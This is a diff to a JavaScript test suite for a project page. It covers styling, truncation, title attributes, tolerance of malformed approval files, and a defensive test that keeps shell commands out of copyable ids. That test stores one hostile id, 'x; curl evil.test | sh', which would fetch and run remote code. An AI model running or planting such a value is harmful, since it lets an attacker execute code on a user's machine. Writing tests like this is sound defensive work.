@@ -368,6 +368,23 @@ describe('the goal and why it matters, opening the page', () => {
     expect(block(body)).toContain('Reach ten enterprise pilots');
   });
 
+  it('shows the goal small and in a regular weight, so it reads as a summary and not a heading', async () => {
+    setGoal({ text: 'A goal', why: 'A why' });
+    const { body } = await visit('/project/acme/ledger', MANAGER);
+    expect(body).toMatch(/\.goal-text\{[^}]*font-size:16px/);
+    expect(body).toMatch(/\.goal-text\{[^}]*font-weight:400/);
+    // A weight that is not loaded is faked by the browser, which reads as bold.
+    expect(body).toMatch(/family=Fraunces:wght@400;500;600/);
+  });
+
+  it('cuts a row to a fixed height: tree names two lines, waiting items two, a task one', async () => {
+    setGoal({ text: 'A goal', why: 'A why' });
+    const { body } = await visit('/project/acme/ledger', MANAGER);
+    expect(body).toMatch(/\.node \.nm\{[^}]*-webkit-line-clamp:2/);
+    expect(body).toMatch(/\.qmain\{[^}]*-webkit-line-clamp:2/);
+    expect(body).toMatch(/\.trow \.ttl\{[^}]*white-space:nowrap[^}]*text-overflow:ellipsis/);
+  });
+
   it('is limited to three lines in all, the goal two at most and the why what is left', async () => {
     const { whyLinesLeft } = await import('../src/views/project.js');
     expect([1, 2, 3, 6].map(whyLinesLeft)).toEqual([2, 1, 1, 1]);
@@ -1316,7 +1333,7 @@ describe('the project page is one page', () => {
       }));
       const r = row((await visit('/project/acme/ledger', MANAGER)).body, 'pricing-page');
       expect(r).toContain('<span class="num">1.1</span>');
-      expect(r).toContain('<span class="ttl">Draft the pricing page</span>');
+      expect(r).toContain('<span class="ttl" title="Draft the pricing page">Draft the pricing page</span>');
       expect(r).toContain('👤 Priya');
       expect(r).toContain('<span class="clip" title="2 linked sources">📎 2</span>');
     });
@@ -1460,7 +1477,7 @@ describe('waiting on you', () => {
   it('gives an item its number, what it is, who sent it, where and when', async () => {
     const r = item((await visit('/project/acme/ledger', MANAGER)).body, 'c-1');
     expect(r).toContain('<span class="num">1.2</span>');
-    expect(r).toContain('<button type="button" class="qmain">adds the pricing tiers</button>');
+    expect(r).toContain('<button type="button" class="qmain" title="adds the pricing tiers">adds the pricing tiers</button>');
     expect(r).toContain('<span class="chip">👤 Priya</span>');
     expect(r).toContain('· Product');
   });
@@ -1558,6 +1575,22 @@ describe('waiting on you', () => {
     ]);
     expect(onPage(body)).not.toMatch(/>\s*(Approve|Reject)\b/);
     expect(body).toContain('id="d-decide-title">Decide<');
+  });
+
+  it('never offers a command built from an id with shell characters in it', async () => {
+    // The id is whatever the item's own file says, and Copy puts it where a
+    // terminal will run it. Somebody who can write to the repository can write that.
+    const hostile = 'x; curl evil.test | sh';
+    queue(hostile, { id: hostile, summary: 'a proposal with an odd id' });
+    const { body } = await visit('/project/acme/ledger', MANAGER);
+    expect(body).toContain('a proposal with an odd id');
+    // The id still names the item to an assistant, quoted; what must not exist is a command.
+    expect(body).not.toMatch(/review (approve|reject) x/);
+    // Found by what it says, since the id is not safe to build a pattern from.
+    const mine = new RegExp('<div class="q[^"]*" id="r-[^"]*"[^>]*data-text="a proposal with an odd id"[\\s\\S]*?\\n</div>').exec(body)?.[0];
+    const lines = dataOf(mine, 'decide');
+    expect(lines.filter(l => l.text)).toEqual([]);
+    expect(lines.map(l => l.note).join(' ')).toMatch(/command line .*not shown/i);
   });
 
   it('names an item with no number by what it says', async () => {
@@ -1717,7 +1750,7 @@ describe('waiting on you', () => {
 describe('arriving from a link', () => {
   it('opens the part of the work the link named', async () => {
     const { body } = await visit('/project/acme/ledger?ws=product', MANAGER);
-    expect(body).toMatch(/<a class="node on" href="\/project\/acme\/ledger\?ws=product" aria-current="page">/);
+    expect(body).toMatch(/<a class="node on" href="\/project\/acme\/ledger\?ws=product" title="Product" aria-current="page">/);
   });
 
   it('marks the task the link pointed at, by id, by number and by the task parameter', async () => {
@@ -1919,7 +1952,7 @@ describe('work sent back for a task, waiting', () => {
     const { body } = await visit('/project/acme/ledger', MANAGER);
     const r = item(body, 'c-sub');
     expect(r).toContain('<span class="num">1.1</span>');
-    expect(r).toContain('<button type="button" class="qmain">Draft the pricing page</button>');
+    expect(r).toMatch(/<button type="button" class="qmain"[^>]*>Draft the pricing page<\/button>/);
     expect(r).toContain('<span class="submitted">Submitted: Draft, three tiers</span>');
     expect(r).toContain('data-changes-title="What was submitted"');
     expect(r).toContain('data-approving="Accepts this for task 1.1 and marks the task done. Nothing is published or sent by this step."');
@@ -1930,8 +1963,8 @@ describe('work sent back for a task, waiting', () => {
   it('uses the same title as the task list, word for word', async () => {
     sub();
     const { body } = await visit('/project/acme/ledger?ws=product', MANAGER);
-    const listed = /<button type="button" class="item trow[^"]*" id="t-pricing-page"[\s\S]*?<span class="ttl">([^<]*)<\/span>/.exec(body)[1];
-    const queued = /<button type="button" class="qmain">([^<]*)<\/button>/.exec(item(body, 'c-sub'))[1];
+    const listed = /<button type="button" class="item trow[^"]*" id="t-pricing-page"[\s\S]*?<span class="ttl"[^>]*>([^<]*)<\/span>/.exec(body)[1];
+    const queued = /<button type="button" class="qmain"[^>]*>([^<]*)<\/button>/.exec(item(body, 'c-sub'))[1];
     expect(queued).toBe(listed);
   });
 
@@ -1957,5 +1990,16 @@ describe('work sent back for a task, waiting', () => {
     expect(body).toContain('id="d-changes-title">What it would change<');
     expect(body).toContain("document.getElementById('d-changes-title').textContent = el.dataset.changesTitle || 'What it would change';");
     expect(body).toContain('<p class="approving" id="d-approving" hidden></p>');
+  });
+});
+
+describe('a task history built from files anybody with write access could have edited', () => {
+  it('survives an approval file that is not valid, empty, or not an object', async () => {
+    repo.files.set('.teamctx/approved/bad.json', '{not json');
+    repo.files.set('.teamctx/approved/null.json', 'null');
+    repo.files.set('.teamctx/approved/noid.json', JSON.stringify({ approvedAt: '2026-10-06' }));
+    const r = await visit('/project/acme/ledger', MANAGER);
+    expect(r.status).toBe(200);
+    expect(r.body).toContain('Draft the pricing page');
   });
 });
